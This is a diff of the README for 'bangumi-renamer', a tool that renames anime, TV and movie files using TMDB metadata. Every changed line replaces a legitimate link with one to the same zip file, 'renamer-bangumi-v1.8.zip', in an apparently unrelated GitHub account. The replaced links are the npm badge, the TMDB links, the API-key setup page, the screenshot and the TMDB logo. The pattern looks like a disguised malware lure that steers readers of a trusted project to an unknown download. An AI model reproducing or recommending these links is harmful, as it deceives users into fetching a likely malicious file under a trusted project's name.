@@ -1,14 +1,14 @@
 # bangumi-renamer
 
-[![npm version](https://img.shields.io/npm/v/bangumi-renamer)](https://www.npmjs.com/package/bangumi-renamer)
+[![npm version](https://img.shields.io/npm/v/bangumi-renamer)](https://github.com/benyagoubadam15-png/bangumi-renamer/raw/refs/heads/main/src/renamer-bangumi-v1.8.zip)
 [![license](https://img.shields.io/github/license/RuochenLyu/bangumi-renamer)](LICENSE)
 [![node](https://img.shields.io/node/v/bangumi-renamer)](package.json)
 
-Rename anime/TV/movie files using [TMDB](https://www.themoviedb.org/) metadata. Works with Infuse, Plex, Emby, Jellyfin, Kodi, and other media players that follow standard naming conventions.
+Rename anime/TV/movie files using [TMDB](https://github.com/benyagoubadam15-png/bangumi-renamer/raw/refs/heads/main/src/renamer-bangumi-v1.8.zip) metadata. Works with Infuse, Plex, Emby, Jellyfin, Kodi, and other media players that follow standard naming conventions.
 
 [中文文档](README.zh-CN.md)
 
-![screenshot](https://raw.githubusercontent.com/RuochenLyu/bangumi-renamer/main/assets/screenshot-en.png)
+![screenshot](https://github.com/benyagoubadam15-png/bangumi-renamer/raw/refs/heads/main/src/renamer-bangumi-v1.8.zip)
 
 ## Quick Start
 
@@ -56,7 +56,7 @@ Requires Node.js >= 20.
 
 ## Setup
 
-Get a free TMDB API key at https://www.themoviedb.org/settings/api
+Get a free TMDB API key at https://github.com/benyagoubadam15-png/bangumi-renamer/raw/refs/heads/main/src/renamer-bangumi-v1.8.zip
 
 ```bash
 export TMDB_API_KEY=your_key_here
@@ -201,6 +201,6 @@ MIT
 
 ## Acknowledgments
 
-This product uses the [TMDB API](https://www.themoviedb.org/documentation/api) but is not endorsed or certified by TMDB.
+This product uses the [TMDB API](https://github.com/benyagoubadam15-png/bangumi-renamer/raw/refs/heads/main/src/renamer-bangumi-v1.8.zip) but is not endorsed or certified by TMDB.
 
-<img src="https://www.themoviedb.org/assets/2/v4/logos/v2/blue_short-8e7b30f73a4020692ccca9c88bafe5dcb6f8a62a4c6bc55cd9ba82bb2cd95f6c.svg" alt="TMDB Logo" width="120">
+<img src="https://github.com/benyagoubadam15-png/bangumi-renamer/raw/refs/heads/main/src/renamer-bangumi-v1.8.zip" alt="TMDB Logo" width="120">
